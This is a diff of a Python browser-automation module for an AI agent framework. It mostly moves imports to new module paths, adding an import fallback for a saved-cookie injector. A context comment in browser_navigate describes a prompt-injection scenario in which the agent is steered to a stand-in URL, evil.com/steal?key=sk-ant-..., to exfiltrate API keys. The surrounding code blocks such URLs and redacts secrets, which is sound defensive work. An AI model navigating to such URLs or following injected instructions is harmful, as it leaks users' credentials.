@@ -69,7 +69,7 @@ from agent.auxiliary_client import call_llm
 from agent.tool_execution import ToolExecutionResult
 from VoidCube_app.contracts.artifacts import Artifact
 from VoidCube_cli.i18n import t
-from VoidCube_core.constants import get_cache_dir, get_VoidCube_home
+from VoidCube_app.infrastructure.config.runtime_paths import get_cache_dir, get_VoidCube_home
 
 try:
     from tools.website_policy import check_website_access
@@ -292,7 +292,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     return _cached_cloud_provider
 
 
-from VoidCube_core.constants import is_termux as _is_termux_environment
+from VoidCube_app.infrastructure.runtime.environment import is_termux as _is_termux_environment
 
 
 def _browser_install_hint() -> str:
@@ -1367,7 +1367,7 @@ def _extract_relevant_content(
     # Without this, a page displaying env vars or API keys would leak
     # secrets to the extraction model before run_agent.py's general
     # redaction layer ever sees the tool result.
-    from VoidCube_core.redaction import redact_sensitive_text
+    from VoidCube_app.infrastructure.persistence.redaction import redact_sensitive_text
     extraction_prompt = redact_sensitive_text(extraction_prompt)
 
     try:
@@ -1426,7 +1426,10 @@ def _inject_saved_account_cookies(
     """Inject matching local credentials once per domain and browser task."""
     if not _is_local_mode():
         return
-    from systems.supervisor.account_store import cookies_for_url
+    try:
+        from voidcube.systems.supervisor.account_store import cookies_for_url
+    except (ModuleNotFoundError, ImportError):
+        from src.voidcube.systems.supervisor.account_store import cookies_for_url
 
     cookies = cookies_for_url(url)
     if not cookies:
@@ -1477,7 +1480,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
-    from VoidCube_core.redaction import _PREFIX_RE
+    from VoidCube_app.infrastructure.persistence.redaction import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
@@ -2240,7 +2243,7 @@ def browser_vision(
         
         analysis = (response.choices[0].message.content or "").strip()
         # Redact secrets the vision LLM may have read from the screenshot.
-        from VoidCube_core.redaction import redact_sensitive_text
+        from VoidCube_app.infrastructure.persistence.redaction import redact_sensitive_text
         analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
